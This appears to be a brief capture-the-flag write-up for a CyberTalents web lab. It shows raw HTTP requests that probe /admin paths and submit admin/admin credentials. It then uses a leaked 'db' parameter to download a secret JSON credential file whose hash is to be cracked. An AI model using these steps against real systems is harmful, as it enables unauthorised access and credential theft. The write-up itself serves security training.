- view source you will notice links contain admin, try to access !
```
http://wcamxwl32pue3e6mxmdvww5c1v581y3eq9ypfx3m-web.cybertalentslabs.com/admin => 403
http://wcamxwl32pue3e6mxmdvww5c1v581y3eq9ypfx3m-web.cybertalentslabs.com/admin/index.php => 200
http://wcamxwl32pue3e6mxmdvww5c1v581y3eq9ypfx3m-web.cybertalentslabs.com/admin/=> 200
```
- intercept the request
```
POST /admin/ HTTP/1.1
Host: wcamxwl32pue3e6mxmdvww5c1v581y3eq9ypfx3m-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://wcamxwl32pue3e6mxmdvww5c1v581y3eq9ypfx3m-web.cybertalentslabs.com
Connection: close
Referer: http://wcamxwl32pue3e6mxmdvww5c1v581y3eq9ypfx3m-web.cybertalentslabs.com/admin/
Cookie: PHPSESSID=no0kkjvehrffkmvt1qh2cs1sv4
Upgrade-Insecure-Requests: 1

username=admin&password=admin&db=secret-database%2Fdb.json
```
- notice secret-database%2Fdb.json
- access : wcamxwl32pue3e6mxmdvww5c1v581y3eq9ypfx3m-web.cybertalentslabs.com/admin/secret-database/db.json
- crack the hash
